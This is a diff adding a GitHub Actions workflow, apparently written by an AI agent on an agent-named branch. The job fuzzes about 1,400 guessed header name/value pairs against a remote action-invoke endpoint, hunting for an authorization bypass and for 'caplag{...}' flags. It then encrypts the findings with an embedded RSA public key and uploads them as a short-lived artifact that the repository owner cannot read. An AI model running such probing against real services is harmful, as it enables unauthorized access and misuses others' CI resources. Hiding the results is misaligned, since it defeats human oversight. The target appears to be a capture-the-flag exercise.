@@ -1,0 +1,72 @@
+name: launchlet-part3-secondaryheaders2
+on:
+  push:
+    branches: [agent/launchlet-part3-secondaryheaders2-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4
+    steps:
+      - name: Probe gated secondary headers and encrypt anomalies
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,itertools,concurrent.futures
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
+          url=base+'/api/actions/invoke'; aid='act_6f4b9a2c1d0e8a71'; proj='launchlet-demo-board'; ws='ws-launchlet-public'
+          body={'actionId':aid,'args':{'workspaceId':ws,'projectId':proj}}
+          baseh={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':proj}
+          baseline=requests.post(url,headers=baseh,json=body,timeout=8); bstatus=baseline.status_code; bbody=baseline.text
+          a=['Launchlet','Deploy','Deployment','Preview','Release','Inspector','Build','Artifact','Server','Action','Runtime','Internal','Enterprise','Production','Publish','Promote']
+          b=['Ref','Reference','Context','Receipt','Proof','Capability','Token','Key','Scope','Mode','Target','Environment','Session','Id','ID','Status','Access','Auth','Authorization','Grant','Secret','Export','Unlock']
+          names=set(['X-'+x+'-'+y for x in a for y in b])
+          names |= {'X-Launchlet-Deploy-Ref','X-Launchlet-Deployment-Ref','X-Launchlet-Preview-Ref','X-Launchlet-Release-Ref','X-Launchlet-Deploy-Context','X-Launchlet-Deployment-Context','X-Launchlet-Release-Context','X-Launchlet-Receipt','X-Launchlet-Build-Receipt','X-Launchlet-Preview-Receipt','X-Launchlet-Proof','X-Launchlet-Capability','X-Launchlet-Deploy-Proof','X-Launchlet-Deploy-Receipt','X-Launchlet-Inspector-Token','X-Launchlet-Inspector-Ref','X-Deploy-Ref','X-Deploy-Context','X-Preview-Ref','X-Release-Ref','X-Server-Action','Next-Action'}
+          vals=['preview-8b11c','lrec_preview_demo_2026','2026.05.16-rc3','launchlet-demo-board','ws-launchlet-internal','1','true','deploy','export']
+          tests=[]
+          # high signal all values; generated headers only ref+receipt+true
+          high=[n for n in names if 'Launchlet' in n and any(k in n for k in ['Deploy','Preview','Inspector','Release'])]
+          for n in high:
+            for v in ['preview-8b11c','lrec_preview_demo_2026','true','export']: tests.append((n,v))
+          for n in names:
+            for v in ['preview-8b11c','lrec_preview_demo_2026']: tests.append((n,v))
+          # de-dup, bounded
+          tests=list(dict.fromkeys(tests))[:1400]
+          def one(nv):
+            n,v=nv
+            try:r=requests.post(url,headers={**baseh,n:v},json=body,timeout=6)
+            except Exception:return None
+            if r.status_code!=bstatus or r.text!=bbody:
+              return {'header':n,'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+          hits=[]
+          with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
+            for x in ex.map(one,tests):
+              if x:
+                hits.append(x)
+                flags=[f for f in re.findall(r'caplag\{[^}]+\}',x.get('body','')) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+                if flags:(out/'FOUND.txt').write_text(json.dumps(x,indent=2));break
+          (out/'summary.json').write_text(json.dumps({'tested':len(tests),'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-secondaryheaders2-encrypted
+          path: artifact/
+          retention-days: 1
